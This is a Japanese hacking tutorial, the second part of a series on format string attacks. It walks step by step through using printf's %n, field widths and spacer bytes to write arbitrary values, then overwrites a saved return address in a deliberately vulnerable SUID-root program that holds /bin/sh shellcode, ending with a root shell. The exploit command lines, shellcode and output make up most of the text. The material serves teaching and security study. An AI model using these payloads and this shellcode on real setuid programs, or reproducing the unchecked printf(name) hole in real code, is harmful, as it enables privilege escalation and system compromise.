x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第○章: はじめてのハッキング　〜フォーマットストリング攻撃2〜 ---

著者：Defolos

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) はじめに

　前回は任意メモリ番地のメモリ内容を出力する方法を解説しました。今回はフ
ォーマットストリング攻撃の真骨頂である、任意メモリ番地の任意書き換えを解
説します。


■0x02.) 書き込み変換指定文字

　通常、変換指定文字は出力する形式を指定するものですが、少し毛色の違う変
換指定文字も存在します。それが「%n」という変換指定文字です。%nは、その関
数内でそれまでに出力された文字数を、対応する引数の変数に格納します。つま
り、メモリ内への書き込みが可能な変換指定文字なのです。

●%nの実際の動き

　%nの実際の動きは、次のようなコードで確認できます。このコードはprintf()
で"Hello World!"という文字列を出力し、その後%nで出力した文字数をtestとい
う変数に格納しています。

-----　test.c
#include <stdio.h>

int main(int argc, char *argv[]){

    int test;
    printf("Hello World!%n\n", &test);
    printf("%d\n", test);

    return 0;
}
-----

　%nは指定されたアドレスに値を格納するので、printf()への第2引数にはアドレ
スを示す&を付与しなければなりません。これをコンパイルし実行すると次のよう
な結果が得られます。

-----
defolos@Glazheim:~/Desktop$ gcc -Wall test.c
defolos@Glazheim:~/Desktop$ ./a.out 
Hello World!
12
-----

　「Hello World!」は12文字ですので、testの中には12が格納されます。つまり、
%nはそれまでに出力したバイト数を書き込むのです。これをうまく利用すれば、
任意の値を書き込むことが可能となります。


■0x03.) 変数の書き換え

　では実際に、変数の中身を書き換えてみます。次のコードはゲームプログラム
の骨格です。ゲームをはじめるにあたって、コマンドライン引数でユーザ名を指
定します。最後にユーザ名とスコアを表示します。今回はゲームルーチンが存在
しないので、スコアは常に0になるはずです。

-----　game.c
#include <stdio.h>

int main(int argc, char *argv[]){

    int score;
    char payload[]=
        "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
        "\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
        "\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
        "\x68";

    char name[150];
    int starge;

    starge = 1;
    score = 0;

    printf("[debug]addr of score = %x\n", &score);
    printf("[debug]addr of payload = %x\n", &payload[0]);

    strcpy(name, argv[1]);

    //game routine

    printf("Score of ");
    printf(name);
    printf(" is %d(%x)!!\n", score, score);

    return 0;
}
-----

　このコードをコンパイルし、実行すると次のようになります。

-----
newbie@Glazheim:knoppix$ game.exe Defolos
[debug]addr of score = bffff9ac
[debug]addr of payload = bffff970
Score of Defolos is 0(0)!!
-----

　しかしながら、見てのとおり「printf(name);」の部分にフォーマットストリン
グバグが存在しています。ここで次のように、変換指定文字を含む文字列をユー
ザ名として与えるとメモリ内が閲覧できてしまいます。

-----
newbie@Glazheim:knoppix$ game.exe AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
[debug]addr of score = bffff98c
[debug]addr of payload = bffff950
Score of AAAAbffffb6b.1.bffff8c4.4d532038.532050.b7eb116c.1.41414141.252e7825.78252e78 is 0(0)!!
-----

　注目していただきたいのは「41414141」の部分です。この41の連続はフォーマ
ットストリングの開始部分を表しているのです。このときのメモリは次のような
レイアウトになっています。

[stack]
0x00----------------------------------------------low
    nameへのアドレス                                   ↑
0x04----------------------------------------------     |
    SFP(bffffb6b)                                      |printf()
0x08----------------------------------------------     |
    ???(1)                                             |
0x0c----------------------------------------------     |
    SEIP(bffff8c4)                                     |
0x0c----------------------------------------------     ↓
    ????(4d532038)
0x10----------------------------------------------
    ????(532050)
0x14----------------------------------------------
    ????(b7eb116c)
0x18----------------------------------------------      ↑
    starge(1)                                           |
0x1c----------------------------------------------      |
    name[150]="AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"       |
0xb4----------------------------------------------      |
    payload[32]                                         |
0xd4----------------------------------------------      |main()
    score(0)                                            |
0xd8----------------------------------------------      |
    SFP                                                 |
0xdc----------------------------------------------      |
    SEIP                                                ↓
0xe0----------------------------------------------high

　printf()が呼び出されると、引数として渡された、フォーマットストリングの
格納されたアドレスから順次文字列を出力していきます。ここではフォーマット
ストリングのアドレスとしてname(0x1c)のアドレスが渡されているため、main()
内のnameの中身を順次出力します。5文字目から変換指定文字が出現しているため、
本来第2引数が格納されているであろう0x04のアドレスを出力します。8つ目の変
換指定文字を出力する段階になると、第8引数が格納されているであろう場所は
0x1cであるためnameの中身が出力されていきます。つまり、「41414141」はname
の先頭を出力しているのです。

　ここで、「AAAA」を引数として参照する8つ目の変換指定文字を%nに変えます。
%nは対応する引数で指定されたアドレスに出力したバイト数を書き込む変換指定
文字でした。つまり、0x41414141番地（AAAAを16進数で表示すると0x41414141）
に51という値を書き込もうとします。しかしながら、0x41414141番地は書き込み
が許されない領域ですのでセグメンテーションフォルトが発生します。

-----
newbie@Glazheim:knoppix$ game.exe AAAA%x.%x.%x.%x.%x.%x.%x.%n.%x.%x
[debug]addr of score = bffff98c
[debug]addr of payload = bffff950
セグメンテーション違反です
-----

　0x41414141番地は書き込み不可領域でしたが、この方法を応用してscore変数の
アドレスを書き換えることができればゲームのスコアを自由に書き換えることが
できるのです。score変数はデバッグ情報より0xbffff98c番地に存在していること
が確認できます。ですので、前回はAAAA(41414141)としていた部分をbffff98cに
変更してやれば、score変数を書き換えることができます。

●リトルエンディアン

　アドレスを構成する場合、エンディアンを考慮しなければなりません。x86系の
linuxではリトルエンディアンが採用されています。エンディアンは以前述べまし
た通り、16進数の記述順序の違いです。おさらいとしてもう一度解説します。リ
トルエンディアンの場合はbffff98cという値を構築するには、まず2桁ずつ区切り
ます。次に一番左のブロックを一番右に書き、二番目に左のブロックをその前に
配置します。つまり、「8c f9 ff bf」となるわけです。

●perlによる出力

　「8c f9 ff bf」という16進数をフォーマットストリングの最初の部分に記述す
れば、bfffff98c番地の内容を書き換えられることがわかりました。しかし、16進
数はキーボードから直接入力することはできません。ASCIIコードに割り振られて
いる16進数は、かろうじて入力が可能ですが0xffや0xfaなどの16進数は入力が不
可能です。そこで、Perlを利用してこれらの数値を入力します。
　Perlはインタプリタ型のスクリプト言語で、コマンドライン上でも動作させる
ことができます。C言語のprintf()のように16進数を出力することができるので、
これを利用します。コマンドラインでPerlを利用する場合は「`printf "\x8c\xf9
\xff\xbf"`」のように「`」で囲みます。\xが16進数であることを表すので、0x8c
f9ffbfが出力されます。
　以上の知識をつなぎ合わせて、score変数を書き換えてみましょう。次のような
文字列をユーザ名として登録すればscore変数が51に書き換えられます。

※下記のコードではscoreの場所がbffff99cになっていますが、これはフォーマッ
トストリングの長さによって動的に変数の場所が確保されるためです。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x9c\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
[debug]addr of score = bffff99c
[debug]addr of payload = bffff960
Score of 鐃緒申鐃?fffb71.1.bffff8d4.4d532038.532050.b7eb116c.1. is 51(33)!! 
-----

　printf()はフォーマットストリングを順に出力し、変換指定文字が見つかれば
本来出力すべき変数が格納されているであろう場所の内容を表示します。8つ目の
変換指定文字はフォーマットストリング自体の場所を示すため、8つ目の変換指定
文字に%nを指定すると、フォーマットスリングの最初の32バイト（8cf9ffbf）を
読みます。これを総出力バイト数を格納するアドレスとして取扱います。ゆえに、
8cf9ffbf番地に51が書き込まれます。
　上記のコードでは8cf9ffbf番地に位置する変数の内容を書き換えましたが、ア
ドレス指定部分を書き換えれば任意の番地に書き込みができます。このように、
%n変換指定文字を利用すれば、任意のアドレス番地のメモリ内容を書き換えるこ
とができます。しかし、%nはそれまでに出力した文字数を書き込むので、このま
までは書き込める内容が決まってしまいます。任意の値を書き込むには、次に説
明するフィールド幅オプションが必要になります。

●フィールド幅オプション

　フィールド幅オプションは、変換指定文字で指定されたデータを出力するに当
たっての最小桁数を指定するものです。例えば、123という値を5桁で表示するよ
うに指定すれば、00123のように先頭が0でパディングされます。記述方法は「%1
00x」のように、%の後に最小桁数を記述し、それに続けて出力フォーマットを指
定します。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x9c\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%10x.%n
[debug]addr of score = bffff99c
[debug]addr of payload = bffff960
Score of 鐃緒申鐃?fffb6f.1.bffff8d4.4d532038.532050.b7eb116c. 1. is 60(3c)!!
-----

　このように、フィールド幅オプションを利用すれば、任意の値を変数に書き込
むことができます。しかし、私たちが目指していることは、SEIP領域をペイロー
ドが格納されたメモリ番地に書き換えてroot権限を奪取することです。フィール
ド幅で指定できる値はさして大きくなく、アドレスのような大きな値をフィール
ド幅に指定することはできません。ゆえに、メモリのような大きな値を書き込む
には特別なテクニックが必要になります。


■0x04.) 多段階書き込みテクニック

　書き込み先として指定した8cf9ffbfですが、これを最下位の桁として考えた場
合、1足した8df9ffbfというアドレスは最下位から2桁目として扱うことができま
す。同様に、2足した8ef9ffbfは3桁目であり、8ff9ffbfは4桁目として扱えます。
よって、bffff98c番地にaa000000を書き込み、その後にbffff98d番地にbb000000
を書き込み、次にbffff98e番地にcc000000を、bffff98f番地にdd000000を書き込
めば、bffff98c番地から見れば「aabbccdd」が書き込まれたことになります。

--------------------------bffff98c
aa 00 00 00
--------------------------bffff98d
   bb 00 00 00
--------------------------bffff98e
      cc 00 00 00
--------------------------bffff98f
         dd 00 00 00
==========================
aa bb cc dd

　このように4つのアドレスをそれぞれの桁として扱い、任意の数値を書き込むこ
とができます。具体的には「`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\x
f9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n」のように、フォーマッ
トストリングに4つのアドレスを立て続けに書きます。初めの%nはフォーマットス
トリングの初めの4バイトを参照し、次の%nはフォーマットストリングの4バイト目
から7バイト目までの4バイトを参照します。

　例として0xddccbbaaという値をscoreに書き込んでみましょう。リトルエンディ
アンですので、はじめにbffff98c番地に0x000000aaを書き込みます。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
[debug]addr of score = bffff98c
[debug]addr of payload = bffff950
Score of 鐃緒申鐃緒申鐃緒申鐃緒申鐃?fffb65.1.bffff8c4.4d532038.532050.b7eb116c.1. is 63(3f)!! 
-----

　フィールド幅オプションなしの状態では63という値が書き込まれます。これを
0xaaにするには、あとどれだけの出力を余分に行えばよいでしょうか。0xaaは10
進数で170ですので、170-63=107。つまり、108文字を余分に出力すれば0xaaを書
き込めます。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%108x.%n
[debug]addr of score = bffff98c
[debug]addr of payload = bffff950
Score of 鐃緒申鐃緒申鐃緒申鐃緒申鐃?fffb62.1.bffff8c4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
-----

　次に、2桁目の出力を行います。2桁目はbffff98d番地に0x000000bbを書き込み
ます。現在のところ、170(0xaa)バイトの出力ができていますが、0xbbはここから
さらに17バイト余分に文字を出力しなくてはなりません。当然、bffff98c番地に
aaを格納するために利用した%108xの後ろに、フィールド幅オプションを指定しな
ければなりません。しかし、%108xの後ろにはもう変換指定文字はありません。で
すので、「`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\
xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n.%x.%n.%x.%n.%x.%n」のようにひとつめ
の%nの後ろに%xを配置し、その後ろに2桁目の%nを置きます。
　ただし、このままでは2桁目の%nの前の%xが、本来2桁目のアドレスである\x8d
\xf9\xff\xbfを参照してしまいます。結果として2桁目の%nは3桁目の\x8e\xf9\x
ff\xbfを参照してしまいます。

                          .-------------------------------------------------.
  .-----------------------|---------------------------------------.         |
 ↓                      ↓                                       |         |
-+-----------+-----------+-----------+-----------+----+----+----+----+----+----+----
 | bfffff98c | bfffff98d | bfffff98e | bfffff98f | %x | %x | ...| %n | %x | %n |
-+-----------+-----------+-----------+-----------+----+----+----+----+----+----+
            ↑                                                         |
             ^---------------------------------------------------------^

●スペーサテクニック

　これを解決するために、アドレスとアドレスの間にスペーサをかませます。つ
まり、%xが参照するためのダミーの文字列をはさみます。変換指定文字は4バイト
を一単位とするため、適当な4文字の文字列をはさみます。よく使われるのは「J
UNK」という文字列ですので、これに習いJUNKをはさんでみます。

                          .-----------------------------------------------------------------------.
  .-----------------------|-------------------------------------------------------------.         |
 ↓                      ↓                                                             |         |
-+-----------+------+-----------+------+-----------+------+-----------+----+----+----+----+----+----+--
 | bfffff98c | JUNK | bfffff98d | JUNK | bfffff98e | JUNK | bfffff98f | %x | %x | ...| %n | %x | %n |
-+-----------+------+-----------+------+-----------+------+-----------+----+----+----+----+----+----+--
             ↑                                                                             |
              ^-----------------------------------------------------------------------------^

　%nの後ろの%xはJUNKを参照します。この%xにフィールド幅オプションを指定す
れば、好きな値を2桁目に書くことができます。それでは、この方式を用いてsco
re変数に0xddccbbaa（10進数では3721182122）を書き込んでみましょう。間にJU
NKという文字列を入れたので、出力バイト数は以前と変化しています。よって、
まずは何も指定しない状態でscore変数に何が格納されるか確認します。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
[debug]addr of score = bffff97c
[debug]addr of payload = bffff940
Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffb59.1.bffff8b4.4d532038.532050.b7eb116c.1. is 75(4b)!! 
-----

　どうやら75のようです。0xaaは10進数で170ですので、170-75=95。つまり、96
を%xの幅指定オプションに指定すれば0xaaを書き込めます。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%96x.%n
[debug]addr of score = bffff97c
[debug]addr of payload = bffff940
Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffb57.1.bffff8b4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
-----

　0xaaと0xbb、0xbbと0xcc、0xccと0xddの間にはそれぞれ17の違いがありますの
で、以降は%xのフィールド幅指定には15（変換指定文字の間の.および変換指定文
字自身を勘定して2を引いている）を指定します。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%96x.%n.%15x.%n.%15x.%n.%15x.%n
[debug]addr of score = bffff96c
[debug]addr of payload = bffff930
Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -573785174(ddccbbaa)!! 
-----

　以上のように、0xddccbbaaを書き込むことができました。ここまでくれば、SE
IPに偽の戻りアドレスを上書きするまで後一歩です。

●戻りアドレスの書き込み

　アドレスを書き込む場合、もうひとつ気にしなければならない項目があります。
アドレスはよく、0x0806abcdのような値になります。0xcdの次に0xabが来ている
ことが今回の議題です。気付いた方もいらっしゃると思いますが、フィールド幅
オプションで指定できたのは値が増えていく場合のみです。アドレスのように引
き算を行わなければならないときは、また別のテクニックを用います。

○桁あふれによるアドレスの書き込み

　加算によって減算を行うことができるというのは周知のことだとは思いますが、
軽く触れておきます。桁が2桁しかない場合、50+67は17になります。桁を無視す
れば50+67は117ですが、2桁であるとすれば繰り上がった桁は無視され17のみが認
識されます。つまり、50+67は加算でありながら50から33を減算したことになりま
す。このように桁あふれを利用すれば加算のみで減算を行うことができるのです。
　これを応用して0x0806abcdを作ってみます。

-----
newbie@Glazheim:knoppix$ ./game.exe `printf "\x7c\xf9\xff\xbfJUNK\x7d\xf9\xff\xbfJUNK\x7e\xf9\xff\xbfJUNK\x7f\xf9\xff\xbf"`%x%x%x%x%x%x%x%n
[debug]add of score = bffff97c
Score of |鐃緒申UNK}鐃緒申UNK~鐃緒申UNK鐃緒申ffffbedb7eb714eb7eb1efcb7ea942cb7fe9b9010 is 75(4b)!! 
-----

　初期値は75であるとわかりました。ここからcdを作ります。0xCD=205なので205
-75=130であり、131をフィールド幅に指定すれば良いことがわかります。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%x.%n.%x.%n.%x.%n
[debug]addr of score = bffff96c
[debug]addr of payload = bffff930
Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb44.1.bffff8a4.4d532038.532050.b7eb116c. 1..4b4e554a..4b4e554a..4b4e554a.is -337520691(ebe1d7cd)!! 
-----

　次に、0xabを作りますが、0xcdから0xabを作らなくてはならないため、桁あふ
れを用います。つまり、0x1AB=427であり、1AB-CD=222ですので、次のフィールド
幅オプションには220を指定します。桁あふれが発生し、減算が可能です。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%x.%n.%x.%n
[debug]addr of score = bffff96c
[debug]addr of payload = bffff930
Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb41.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a..4b4e554a..4b4e554a. is -1078613043(bfb5abcd)!! 
-----

　次に0x06を作成しますが、これもまた桁あふれを利用しなくてはなりません。
0x106=262、0x106-0xAB=0x5B=91ですので、フィールド幅には89を指定します。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%89x.%n.%x.%n
[debug]addr of score = bffff96c
[debug]addr of payload = bffff930
Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3f.1.bffff8a4.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a..4b4e554a. is 268872653(1006abcd)!!
-----

　最後にx08を作成します。これは一見、0x08の方が大きいので加算のみで作成で
きそうですが、フィールド幅オプションは「最小」表示桁数であることに注意し
てください。つまり、3桁で表示すると指定しても、データが5桁であれば5桁で表
示されます。ゆえに、これもまた桁あふれを利用しなければなりません。x108-x06
 = x102 = 258ですので、256を指定します。

-----
newbie@Glazheim:knoppix$ game.exe `printf "\x5c\xf9\xff\xbfJUNK\x5d\xf9\xff\xbfJUNK\x5e\xf9\xff\xbfJUNK\x5f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%131x.%n.%220x.%n.%89x.%n.%256x.%n
[debug]addr of score = bffff95c
[debug]addr of payload = bffff920
Score of \鐃緒申UNK]鐃緒申UNK^鐃緒申UNK_鐃緒申ffffb3c.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 134654925(806abcd)!! 
-----

　以上のように、0x0806abcdを作成することができました。これでどのような値
でも任意のメモリに書き込むことができるようになったわけです。その記念（？）
にroot権限の奪取を実証してみましょう。


■0x05.) root権限奪取の実証

　お気づきの方もいらっしゃるでしょうが、今回のサンプルコードにはシェルコ
ードが格納された配列が備わっています。通常、まともなプログラムにはこのよ
うなあからさまな脆弱性はありません。シェルコードはデバッグ情報からbffff9
20番地に存在していることが確認できます。また、main関数のSEIPの場所はbfff
f96c番地に存在しています。つまり、bffff96c番地の中身をbffff920に書き換え
ることができれば、main関数の終了時にpayload配列の先頭に処理が移り、シェル
コードが起動します。

●まずはscoreで試してみよう

　いきなりbffff96c番地の値を書き換えるのはあまりおすすめできません。とい
いますのも、bffff96c番地は出力されないので、本当にうまく0xbffff920が生成
できているか確認がとれないためです。ですので、はじめは出力されるscore変数
に0xbffff920を作ってみます。

-----
newbie@Glazheim:knoppix$ ./game.exe `printf "\x5c\xf9\xff\xbfJUNK\x5d\xf9\xff\xbfJUNK\x5e\xf9\xff\xbfJUNK\x5f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%214x.%n.%215x.%n.%260x.%n.%190x.%n
[debug]addr of score = bffff95c
[debug]addr of payload = bffff920
Score of \鐃緒申UNK]鐃緒申UNK^鐃緒申UNK_鐃緒申ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is -1073743584(bffff920)!! 
-----

　0xbffff920の生成手順は先述の通り、桁あふれを利用して生成します。score内
に正常に生成できていることが確認できました。

●権限奪取

　それでは、bffff96c番地を0xbffff920に書き換えてみましょう。先ほどの入力
のうち、アドレス部分を書き換えればOKです。game.exeはSUIDビットが立ってい
て、所有者がrootになっています。

-----
newbie@Glazheim:knoppix$ ./game.exe `printf "\x6c\xf9\xff\xbfJUNK\x6d\xf9\xff\xbfJUNK\x6e\xf9\xff\xbfJUNK\x6f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%230x.%n.%199x.%n.%260x.%n.%190x.%n
[debug]addr of score = bffff95c
[debug]addr of payload = bffff920
Score of l鐃緒申UNKm鐃緒申UNKn鐃緒申UNKo鐃緒申ffffb3b.1.bffff894.4d532038.532050.b7eb116c. 1.. 4b4e554a.. 4b4e554a.. 4b4e554a. is 0(0)!!
sh-3.00# whoami
root
-----

　root権限が奪取できていることが確認できました。このように、SEIPをペイロ
ードの先頭に書き換えることができれば、BOFの時と同じように制御がペイロード
に移ります。今回はペイロードの格納先として、プログラム内の配列を用いまし
たが、環境変数に格納したペイロードに制御を移すことも可能です。これについ
てはまたいずれ、時間があるときに触れたいと思います。


■0x06.) おわりに

　いかがでしたでしょうか。フォーマットストリング攻撃でも任意のプログラム
を実行できることをご理解いただけたと思います。かなり危険なバグですが、妙
な入力が行われない限り通常どおり出力されるため、発見が難しいバグです。
　さて、今回まででBOFとフォーマットストリング攻撃という2大攻撃手法を用い
てroot権限を奪取する実証を行ってきました。現在流行している、ひと通りのハ
ッキング手法を軽く解説しましたので、次回は少し侵入系のトピックスから離れ
て見ます。次回はバックドア（裏口作成）について解説したいと思います。



